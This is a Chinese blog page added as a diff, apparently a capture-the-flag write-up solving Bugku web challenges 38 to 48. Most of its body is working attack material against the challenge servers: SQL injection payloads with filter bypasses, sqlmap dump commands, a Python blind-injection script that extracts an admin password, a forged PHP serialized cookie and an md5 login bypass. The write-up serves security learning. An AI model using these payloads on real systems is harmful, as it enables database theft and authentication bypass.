@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.0.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.0.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.0.0" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="一、第38题（这是一个神奇的登陆框）方法一首先我们抓包，经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。爆数据库 admin_name=1&amp;quot; union select database(),2#&amp;amp;admin_passwd=1&amp;amp;submit=GO+GO+GO 爆数据表 admin_name=1&amp;quot; union select (select table">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bugku 38-48 writeup(web)">
+<meta property="og:url" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/index.html">
+<meta property="og:site_name" content="giun">
+<meta property="og:description" content="一、第38题（这是一个神奇的登陆框）方法一首先我们抓包，经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。爆数据库 admin_name=1&amp;quot; union select database(),2#&amp;amp;admin_passwd=1&amp;amp;submit=GO+GO+GO 爆数据表 admin_name=1&amp;quot; union select (select table">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/1.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/2.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/3.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/4.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/5.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/6.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/7.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/8.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/9.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/10.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/11.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/12.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/13.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/14.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/15.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/16.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/17.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/18.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/19.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/20.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/21.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/22.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/23.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/24.jpg">
+<meta property="og:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/25.jpg">
+<meta property="og:updated_time" content="2019-04-08T12:14:34.443Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bugku 38-48 writeup(web)">
+<meta name="twitter:description" content="一、第38题（这是一个神奇的登陆框）方法一首先我们抓包，经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。爆数据库 admin_name=1&amp;quot; union select database(),2#&amp;amp;admin_passwd=1&amp;amp;submit=GO+GO+GO 爆数据表 admin_name=1&amp;quot; union select (select table">
+<meta name="twitter:image" content="https://wrgiun.github.io/2019/04/08/bugku-38-48/1.jpg">
+
+
+
+
+
+
+  <link rel="canonical" href="https://wrgiun.github.io/2019/04/08/bugku-38-48/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>bugku 38-48 writeup(web) | giun</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giun</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/04/08/bugku-38-48/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">bugku 38-48 writeup(web)
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-08 20:02:30 / 修改时间：20:14:34" itemprop="dateCreated datePublished" datetime="2019-04-08T20:02:30+08:00">2019-04-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/bugkuCTF/" itemprop="url" rel="index"><span itemprop="name">bugkuCTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="一、第38题（这是一个神奇的登陆框）"><a href="#一、第38题（这是一个神奇的登陆框）" class="headerlink" title="一、第38题（这是一个神奇的登陆框）"></a>一、第38题（这是一个神奇的登陆框）</h2><p><strong>方法一</strong><br>首先我们抓包，<br>经过一些尝试发现存在sql注入，并且sql语句是使用“来闭合的。<br><strong>爆数据库</strong></p>
+<pre><code>admin_name=1&quot; union select database(),2#&amp;admin_passwd=1&amp;submit=GO+GO+GO
+</code></pre><p><img src="/2019/04/08/bugku-38-48/1.jpg" alt="在这里插入图片描述"><br><strong>爆数据表</strong></p>
+<pre><code>admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO
+</code></pre><p><img src="/2019/04/08/bugku-38-48/2.jpg" alt="在这里插入图片描述"><br><strong>爆字段名</strong></p>
+<pre><code>admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO
+</code></pre><p><img src="/2019/04/08/bugku-38-48/3.jpg" alt="在这里插入图片描述"><br><strong>爆数据</strong></p>
+<pre><code>admin_name=1&quot; union select (select flag1 from flag1),2%23&amp;admin_passwd=1&amp;submit=GO+GO+GO
+</code></pre><p><img src="/2019/04/08/bugku-38-48/4.jpg" alt="在这里插入图片描述"><br><strong>方法二</strong><br>将抓到的报保存为.txt文件放在sqlmap的安装目录下。<br><strong>爆数据库</strong></p>
+<pre><code>python2 sqlmap.py -r &quot;3.txt&quot; -p admin_name --dbs
+</code></pre><p><img src="/2019/04/08/bugku-38-48/5.jpg" alt="在这里插入图片描述"><br><strong>爆表</strong></p>
+<pre><code>python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -p admin_name --tables
+</code></pre><p><img src="/2019/04/08/bugku-38-48/6.jpg" alt="在这里插入图片描述"><br><strong>爆字段名</strong><br><img src="/2019/04/08/bugku-38-48/7.jpg" alt="在这里插入图片描述"><br>爆数据</p>
+<pre><code>python2 sqlmap.py -r &quot;3.txt&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump
+</code></pre><p><img src="/2019/04/08/bugku-38-48/8.jpg" alt="在这里插入图片描述"><br>以上2种方法均是对admin_name进行注入，当然也可以对admin_passwd进行注入</p>
+<h2 id="二、第39题（多次）"><a href="#二、第39题（多次）" class="headerlink" title="二、第39题（多次）"></a>二、第39题（多次）</h2><pre><code>尝试id=1&apos;,发现报错，
+尝试id=1&apos; --+发现没有报错
+说明存在sql注入
+
+尝试id=1&apos; or --+报错，
+说明存在某种过滤
+尝试id=1&apos; oorr --+发现没有报错
+</code></pre><p>在这里我们可以使用异或注入来检查哪些字符被过滤<br>这时我们可以用异或注入来检测，异或即两个条件相同（同真或同假）即为假</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=1&apos;^(length(&apos;or&apos;)!=0)--+
+</code></pre><p>当length（）里的字符被过滤时，就输出there is nothing.<br>经过一些尝试可以知道<br>and or select union被绕过</p>
+<p><strong>开始爆数据库</strong></p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos;  uniunionon seselectlect 1,database()--+
+</code></pre><p>可以爆出数据库为<br><img src="/2019/04/08/bugku-38-48/9.jpg" alt="在这里插入图片描述"><br><strong>爆表</strong></p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect
+1,group_concat(table_name) from infoorrmation_schema.tables 
+where table_schema=&quot;web1002-1&quot;--+
+</code></pre><p><img src="/2019/04/08/bugku-38-48/10.jpg" alt="在这里插入图片描述"></p>
+<p><strong>爆字段</strong></p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos;  uniunionon seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&quot;flag1&quot;--+
+</code></pre><p><img src="/2019/04/08/bugku-38-48/11.jpg" alt="在这里插入图片描述"><br><strong>爆数据</strong></p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos;  uniunionon seselectlect 1,flag1 from flag--+
+</code></pre><p><img src="/2019/04/08/bugku-38-48/12.jpg" alt="在这里插入图片描述"><br>提交flag 发现是假的flag,那么我们爆另一个字段<br><img src="/2019/04/08/bugku-38-48/13.jpg" alt="在这里插入图片描述"><br>使用上面的方法，经过尝试发现我们注入的代码会在IP处不解析的输出<br><img src="/2019/04/08/bugku-38-48/14.jpg" alt="在这里插入图片描述"><br>那么我们尝试下报错注入<br><strong>爆数据库</strong></p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and
+(extractvalue(1,concat(0x7e,database(),0x7e)))--+
+</code></pre><p><img src="/2019/04/08/bugku-38-48/15.jpg" alt="在这里插入图片描述"><br><strong>爆数据表</strong><br><a href="http://123.206.87.240:9004/Once_More.php?id=1&#39;" target="_blank" rel="noopener">http://123.206.87.240:9004/Once_More.php?id=1&#39;</a> and<br>(extractvalue(1,concat(0x7e,<br>(select group_concat(column_name) from information_schema.columns<br>where table_schema=”web1002-2”),0x7e)))–+<br><img src="/2019/04/08/bugku-38-48/16.jpg" alt="在这里插入图片描述"><br><strong>爆字段（其实我们可以猜测字段名为flag2）</strong></p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and 
+(extractvalue(1,concat(0x7e,
+(select group_concat(column_name) from information_schema.columns 
+where table_schema=&quot;web1002-2&quot; and table_name=&quot;flag2&quot;),0x7e)))--+
+</code></pre><p>爆flag</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and 
+(extractvalue(1,concat(0x7e,
+(select group_concat(flag2) from flag2),0x7e)))--+
+</code></pre><p><img src="/2019/04/08/bugku-38-48/17.jpg" alt="在这里插入图片描述"></p>
+<h2 id="三、第40题（PHP-encrypt-1）"><a href="#三、第40题（PHP-encrypt-1）" class="headerlink" title="三、第40题（PHP_encrypt_1）"></a>三、第40题（PHP_encrypt_1）</h2><p>题目给出了压缩包，下载打开，发现是某种加密方式，需要我们阅读代码，写出解密代码</p>
+<pre><code>&lt;?php
+function encrypt($data,$key)
+{
+    $key = md5(&apos;ISCC&apos;);
+    $x = 0;
+    $len = strlen($data);
+    $klen = strlen($key);
+    for ($i=0; $i &lt; $len; $i++) { 
+        if ($x == $klen)
+        {
+            $x = 0;
+        }
+        $char .= $key[$x];
+        $x+=1;
+    }
+    for ($i=0; $i &lt; $len; $i++) {
+        $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);
+    }
+    return base64_encode($str);
+}
+?&gt;
+</code></pre><p>参考网上的大佬写的代码，该题涉及密码学，逆向，web</p>
+<pre><code>&lt;?php
+function decrypt($str) {
+    $mkey = &quot;729623334f0aa2784a1599fd374c120d&quot;;
+    $klen = strlen($mkey);
+    $tmp = $str;
+    $tmp = base64_decode($tmp);  // 对 base64 后的字符串 decode
+    $md_len = strlen($tmp); //获取字符串长度
+    for ($i=0; $i &lt; $md_len; $i++) {  //  取二次加密用 key;
+        if ($x == $klen)  // 数据长度是否超过 key 长度检测
+            $x = 0;
+        $char .= $mkey[$x];  // 从 key 中取二次加密用 key
+        $x+=1;
+    }
+    $md_data = array();
+    for($i=0;$i&lt;$md_len;$i++) { // 取偏移后密文数据
+        array_push($md_data, ord($tmp[$i]));
+    }
+    $md_data_source = array();
+    $data1 = &quot;&quot;;
+    $data2 = &quot;&quot;;
+    foreach ($md_data as $key =&gt; $value) { // 对偏移后的密文数据进行还原
+        $i = $key;
+        if($i &gt;= strlen($mkey)) {$i = $i - strlen($mkey);}
+        $dd = $value;
+        $od = ord($mkey[$i]);
+        array_push($md_data_source,$dd);
+        $data1 .= chr(($dd+128)-$od);  // 第一种可能, 余数+128-key 为回归数
+        $data2 .= chr($dd-$od);  // 第二种可能, 余数直接-key 为回归数
+    }
+    print &quot;data1 =&gt; &quot;.$data1.&quot;&lt;br&gt;\n&quot;;
+    print &quot;data2 =&gt; &quot;.$data2.&quot;&lt;br&gt;\n&quot;;
+}
+$str = &quot;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&quot;;
+decrypt($str);
+?&gt;
+</code></pre><h2 id="四、第41题（文件包含2）"><a href="#四、第41题（文件包含2）" class="headerlink" title="四、第41题（文件包含2）"></a>四、第41题（文件包含2）</h2><p>由于无法打卡该题目网站，本题略</p>
+<h2 id="四、第42题（文件包含2）"><a href="#四、第42题（文件包含2）" class="headerlink" title="四、第42题（文件包含2）"></a>四、第42题（文件包含2）</h2><p>这题考的是代码审计<br>首先，我们提交login发现没反应，题目提示hint那么我们传入？hint=1试试，发现</p>
+<pre><code> &lt;?php
+error_reporting(0);
+include_once(&quot;flag.php&quot;);
+$cookie = $_COOKIE[&apos;ISecer&apos;];
+if(isset($_GET[&apos;hint&apos;])){
+    show_source(__FILE__);
+}
+elseif (unserialize($cookie) === &quot;$KEY&quot;)
+{   
+    echo &quot;$flag&quot;;
+}
+else {
+?&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
+&lt;title&gt;Login&lt;/title&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;br&gt;
+&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;
+  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;
+    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;
+  &lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+&lt;?php
+}
+$KEY=&apos;ISecer:www.isecer.com&apos;;
+?&gt; 
+</code></pre><p>然后开始审计代码发现，<br>这是个php反序列。</p>
+<pre><code>$cookie = $_COOKIE[&apos;ISecer&apos;];
+</code></pre><p>代码逻辑就是，传入一个cookie：ISecer，如果ISecer反序列化的结果和KEY相等，就弹出flag。<br>也就是cookie的参数的值必须为<code>$kEY</code>的值的序列化。<br>注意<code>$key</code>的值在调用的时候还没有被定义<br>构造序列化字符串</p>
+<pre><code>&lt;?php
+echo serialize(&apos;&apos;);
+?&gt;
+</code></pre><p>输出s:0:’’</p>
+<p>然后我们抓包将Cookie的值改为ISecer=s:0:’’，即可得出flag<br><img src="/2019/04/08/bugku-38-48/18.jpg" alt="在这里插入图片描述"></p>
+<h2 id="五、第43题（sql2）"><a href="#五、第43题（sql2）" class="headerlink" title="五、第43题（sql2）"></a>五、第43题（sql2）</h2><p>该题为post型的sql注入，尝试了各种sql注入发现都被过滤了，当时那个绝望呀。<br>去看别人博客提示说是DS_Store源码泄露，然后就需要用到python脚本来跑一下了，发现了flag目录，直接访问，然后就得到了flag。<br><img src="/2019/04/08/bugku-38-48/19.jpg" alt="在这里插入图片描述"><br>DS_Store下载地址：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a></p>
+<p>我们了解下什么是<a href="https://blog.csdn.net/weixin_34081595/article/details/85945447#san" target="_blank" rel="noopener">DS_Store源码泄露</a></p>
+<h2 id="六、第45题（Trim的日记本）"><a href="#六、第45题（Trim的日记本）" class="headerlink" title="六、第45题（Trim的日记本）"></a>六、第45题（Trim的日记本）</h2><p>登入，额发现题目的出了点问题，不够不影响我们解题，扫描<br><img src="/2019/04/08/bugku-38-48/20.jpg" alt="在这里插入图片描述"><br>登录<a href="http://123.206.87.240:9002/show.php" target="_blank" rel="noopener">http://123.206.87.240:9002/show.php</a><br><img src="/2019/04/08/bugku-38-48/21.jpg" alt="在这里插入图片描述"><br>提交flag竟然是真的。</p>
+<h2 id="七、第46题（login2）"><a href="#七、第46题（login2）" class="headerlink" title="七、第46题（login2）"></a>七、第46题（login2）</h2><p>第一步抓包<br><img src="/2019/04/08/bugku-38-48/22.jpg" alt="在这里插入图片描述"><br>可以发现这边有一堆base64加密的编码<br>解密</p>
+<pre><code>$sql=&quot;SELECT username,password FROM admin WHERE username=&apos;&quot;.$username.&quot;&apos;&quot;;
+if (!empty($row) &amp;&amp; $row[&apos;password&apos;]===md5($password)){
+</code></pre><p>这段代码的意思大概就是，通过输入不存在用户，用union select 构造出指定密码的md5值，即可登入成功<br>username=1’ union select 1,md5(1)#&amp;password=1<br><img src="/2019/04/08/bugku-38-48/23.jpg" alt="在这里插入图片描述"></p>
+<p><img src="/2019/04/08/bugku-38-48/24.jpg" alt="在这里插入图片描述"></p>
+<h2 id="八、第47题（login3）"><a href="#八、第47题（login3）" class="headerlink" title="八、第47题（login3）"></a>八、第47题（login3）</h2><p>我们先尝试下账号admin密码pass,发现返回密码错误。<br>账号admin’,密码pass发现<br><img src="/2019/04/08/bugku-38-48/25.jpg" alt="在这里插入图片描述"><br>说明本题应该使用布尔盲注<br>再构造语句，进行几次的基于bool盲注的注入，查看一下有没有绕过一些特殊的语句</p>
+<p>username=’^(1)^1#&amp;password=123<br>在测试过程中，发现过滤了 ‘空格’ 以及 ’=‘ ，则空格可以使用  () 代替，=可以使用 &lt;&gt; 代替,还有and information。<br>那么我们应该想到使用脚本，毕竟手动盲注什么时候是个头，然后将得到的密码MD5解密<br>附上脚本代码</p>
+<pre><code>import requests
+guess = &quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ {}+-*/=&quot;
+url = &quot;http://123.206.31.85:49167/&quot;
+database=&quot;&quot;
+for i in range(0,35):
+    for j in guess:
+        # uname = &quot;admin&apos;^(ascii(mid(database()from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j))
+        uname = &quot;admin&apos;^(ascii(mid((select(password)from(admin))from(%i)))&lt;&gt;%s)^0#&quot;%(i,ord(j))
+        data = {
+            &quot;username&quot;:uname,
+            &quot;password&quot;:&quot;123&quot;
+        }
+        res = requests.post(url=url,data=data).text
+        if &quot;password error&quot; in res:
+            database += j
+            print(database)
+            break
+</code></pre><p>大家也可以参考下这篇文章<a href="https://blog.csdn.net/qq_42133828/article/details/86815663" target="_blank" rel="noopener">https://blog.csdn.net/qq_42133828/article/details/86815663</a></p>
+<h2 id="九、第48题（login4）"><a href="#九、第48题（login4）" class="headerlink" title="九、第48题（login4）"></a>九、第48题（login4）</h2><p>经过尝试发现题目说只有admin可以看到flag又说admin不允许登录<br>参考这篇文章<br><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a></p>
+<h2 id="十、文件上传2（湘桥杯）"><a href="#十、文件上传2（湘桥杯）" class="headerlink" title="十、文件上传2（湘桥杯）"></a>十、文件上传2（湘桥杯）</h2><p>不知道为什么进不了题目<br>大家可以参考下这篇文章<br><a href="https://www.jianshu.com/p/59730b290120" target="_blank" rel="noopener">https://www.jianshu.com/p/59730b290120</a></p>
+<h2 id="十一、秋名山老司机"><a href="#十一、秋名山老司机" class="headerlink" title="十一、秋名山老司机"></a>十一、秋名山老司机</h2><p>直接用python脚本即可得出flag</p>
+<pre><code>#coding:utf-8
+import requests
+import re
+url = &quot;http://123.206.87.240:8002/qiumingshan/&quot;
+res = requests.session()
+s = res.get(url).text
+num = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;,s).group()
+result = eval(num)
+data = {&apos;value&apos;:result}
+print(res.post(url=url,data=data).text)
+</code></pre>
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>wr</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://wrgiun.github.io/2019/04/08/bugku-38-48/" title="bugku 38-48 writeup(web)">https://wrgiun.github.io/2019/04/08/bugku-38-48/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/08/bugku-29-36/" rel="next" title="bugku-29-36 writeup(web)">
+                <i class="fa fa-chevron-left"></i> bugku-29-36 writeup(web)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/08/upload-labs-1-17/" rel="prev" title="upload-labs 1-17">
+                upload-labs 1-17 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="wr">
+            
+              <p class="site-author-name" itemprop="name">wr</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">25</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
